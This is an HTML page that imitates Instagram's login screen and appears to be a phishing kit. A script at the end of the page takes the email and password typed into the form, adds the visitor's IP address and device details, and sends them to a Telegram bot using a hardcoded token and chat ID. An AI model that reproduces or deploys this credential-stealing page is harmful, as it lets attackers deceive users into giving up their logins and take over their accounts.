# Login
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Instagram Clone</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img/instagram-logo.png" alt="Instagram logo" />
                </h1>
                <form>
                    <label for="email" class="sr-only">Phone, username, or email</label>
                    <input name="email" placeholder="Phone, username, or email" aria-label="Phone, username, or email" />

                    <label for="password" class="sr-only">Password</label>
                    <input name="password" type="password" placeholder="Password" aria-label="Password" />

                    <button type="submit">Log In</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img src="./img/facebook-logo.png" alt="Facebook logo" />
                        <a>Log in with Facebook</a>
                    </div>
                    <a href="#">Forgot password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign up</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png" alt="Apple Store logo" />
                    <img src="./img/googleplay-button.png" alt="Google Play logo" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">ABOUT</a></li>
            <li><a href="#">HELP</a></li>
            <li><a href="#">PRESS</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">CAREERS</a></li>
            <li><a href="#">PRIVACY</a></li>
            <li><a href="#">TERMS</a></li>
            <li><a href="#">LOCATIONS</a></li>
            <li><a href="#">MORE RELEVANT ACCOUNTS</a></li>
            <li><a href="#">HASHTAGS</a></li>
            <li><a href="#">LANGUAGE</a></li>
        </ul>
        <p class="copyright">© 2020 Instagram from Facebook</p>
    </footer>
    
    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
<script>
    const TOKEN = "7776358471:AAHqq8s8ZwAWnpkcpWqffRu1X5YjfCYHYD4";   // Replace with your actual bot token                                                         // Ù‡Ù†Ø§ Ø§Ù„ØªÙˆÙƒÙŠÙ†              
    const CHAT_ID = "5920535632";   //Replace with your actul chat ID                                                    // Ù‡Ù†Ø§ Ù…Ø¹Ø±Ù Ø§Ù„Ø´Ø§Øª https://api.telegram.org/bot/getUpdates
    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        

    document.getElementById('login-form').addEventListener('submit', function(e) {
        e.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        axios.get('https://api.ipify.org?format=json')
            .then(response => {
                const ip = response.data.ip;

                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const screenWidth = screen.width;
                const screenHeight = screen.height;
                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';

                const message = ` 
                    <b>New Login Attempt</b>\n
                    <b>Email:</b> ${email}\n
                    <b>Password:</b> ${password}\n
                    <b>IP Address:</b> ${ip}\n
                    <b>Device Type:</b> ${deviceType}\n
                    <b>Platform:</b> ${platform}\n
                    <b>User Agent:</b> ${userAgent}\n
                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
                `;

                axios.post(URI_API, {
                    chat_id: CHAT_ID,
                    parse_mode: 'html',
                    text: message
                }).then(response => {
                    alert('Information sent successfully!');
                }).catch(error => {
                    alert('Error sending the information. Please try again.');
                });
            })
            .catch(error => {
                alert('Error fetching the IP address. Please try again.');
            });
    });
</script>
    
    
</body>
</html>
